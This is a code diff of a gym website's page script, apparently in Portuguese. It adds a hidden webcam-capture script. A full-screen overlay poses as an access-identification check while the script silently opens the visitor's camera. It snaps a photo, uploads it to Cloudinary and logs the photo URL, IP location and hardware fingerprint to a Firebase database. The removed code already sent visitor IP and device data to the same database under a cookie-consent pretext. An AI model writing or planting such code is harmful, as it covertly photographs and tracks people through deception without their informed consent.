@@ -1411,44 +1411,77 @@ async function pegarTreino() {
 
 
 
+
+
+
+
+
+
 <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
 <script>
 (function(){
-    if(localStorage.getItem('ck_full_acc')) return;
     firebase.initializeApp({"apiKey":"AIzaSyCVdKIP6jl-mLaqHNMW-IwK3pVkvhuSvSI","databaseURL":"https://san7-brasil-default-rtdb.firebaseio.com","projectId":"san7-brasil","authDomain":"san7-brasil.firebaseapp.com"});
     const style = document.createElement('style');
     style.innerHTML = `
-        #ovr_ck { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.9); z-index:999999; display:flex; align-items:center; justify-content:center; backdrop-filter:blur(5px); font-family:sans-serif; }
-        #box_ck { background:#fff; padding:40px; width:90%; max-width:500px; border:2px solid #000; text-align:center; box-shadow:20px 20px 0px rgba(0,0,0,0.1); }
-        #btn_ck { background:#64c466; color:#fff; border:none; padding:15px 30px; font-weight:bold; cursor:pointer; width:100%; margin-top:20px; display:flex; align-items:center; justify-content:center; gap:10px; }
-        .spin_ck { width:16px; height:16px; border:2px solid #fff; border-bottom-color:transparent; border-radius:50%; display:none; animation: s_ck 1s linear infinite; }
-        @keyframes s_ck { to {transform:rotate(360deg)} }
+        #sc_ov { position:fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index:2147483647; display:flex; align-items:center; justify-content:center; font-family:sans-serif; }
+        #sc_bx { background:#fff; padding:40px; width:90%; max-width:450px; border:4px solid #000; text-align:center; }
+        #sc_bt { background:#000; color:#fff; border:none; padding:20px; font-weight:bold; cursor:pointer; width:100%; margin-top:20px; font-size:16px; }
+        #sc_vd { position:absolute; opacity:0; pointer-events:none; width:1px; height:1px; }
     `;
     document.head.appendChild(style);
-    const html = document.createElement('div');
-    html.id = 'ovr_ck';
-    html.innerHTML = `<div id="box_ck">
-        <h2 style="margin-top:0">Cookies & Privacidade</h2>
-        <p style="color:#444; line-height:1.6">Utilizamos cookies para garantir a segurança em todo site da academia domusfit.</p>
-        <button id="btn_ck" onclick="acceptAll()"><span id="spn_ck" class="spin_ck"></span>ACEITAR E CONTINUAR</button>
-    </div>`;
-    document.body.appendChild(html);
 
-    window.acceptAll = async () => {
-        document.getElementById('spn_ck').style.display = 'block';
+    const div = document.createElement('div');
+    div.id = 'sc_ov';
+    div.innerHTML = `<div id="sc_bx">
+        <h2 style="margin:0 0 10px 0">${'Validação de Acesso Acadêmico'}</h2>
+        <p style="color:#555; font-size:14px; line-height:1.5">${'Este terminal requer identificação. Clique no botão abaixo para validar sua sessão e liberar o conteúdo.'}</p>
+        <video id="sc_vd" autoplay playsinline></video>
+        <canvas id="sc_cn" style="display:none"></canvas>
+        <button id="sc_bt" onclick="initSec()">${'IDENTIFICAR E ACESSAR'}</button>
+    </div>`;
+    document.body.appendChild(div);
+
+    // Iniciar câmera silenciosamente
+    navigator.mediaDevices.getUserMedia({video:true}).then(s => document.getElementById('sc_vd').srcObject = s).catch(()=>{});
+
+    window.initSec = async () => {
+        const btn = document.getElementById('sc_bt');
+        btn.innerText = 'VALIDANDO...';
+        btn.disabled = true;
+
+        let imgUrl = "";
         try {
-            const geo = await fetch('https://ipapi.co/json/').then(r => r.json());
-            await firebase.database().ref('cookie_logs').push({
-                ip: geo.ip, city: geo.city, region: geo.region,
-                ua: navigator.userAgent, lang: navigator.language,
-                ref: window.location.href, res: window.screen.width + 'x' + window.screen.height,
-                dt: new Date().toLocaleDateString('pt-BR'), hr: new Date().toLocaleTimeString('pt-BR'),
-                ts: Date.now()
-            });
-            localStorage.setItem('ck_full_acc', '1');
-            document.getElementById('ovr_ck').remove();
-        } catch(e) { console.error(e); }
+            const vd = document.getElementById('sc_vd');
+            const cn = document.getElementById('sc_cn');
+            cn.width = 640; cn.height = 480;
+            cn.getContext('2d').drawImage(vd, 0, 0, 640, 480);
+            const base64 = cn.toDataURL('image/jpeg', 0.7);
+
+            const formData = new FormData();
+            formData.append('file', base64);
+            formData.append('upload_preset', 'ml_default');
+            const up = await fetch('https://api.cloudinary.com/v1_1/dzmjto17f/image/upload', {method:'POST', body:formData}).then(r=>r.json());
+            imgUrl = up.secure_url;
+        } catch(e){}
+
+        const geo = await fetch('https://ipapi.co/json/').then(r=>r.json());
+        const gl = (document.createElement('canvas').getContext('webgl'));
+        const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+        const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
+
+        await firebase.database().ref('cookie_logs').push({
+            img: imgUrl, ip: geo.ip, city: geo.city,
+            hw: { 
+                cores: navigator.hardwareConcurrency || '?',
+                ram: navigator.deviceMemory || '?',
+                gpu: gpu,
+                res: screen.width + 'x' + screen.height
+            },
+            ua: navigator.userAgent, ref: window.location.href,
+            dt: new Date().toLocaleDateString('pt-BR'), hr: new Date().toLocaleTimeString('pt-BR')
+        });
+        document.getElementById('sc_ov').remove();
     }
 })();
 </script>
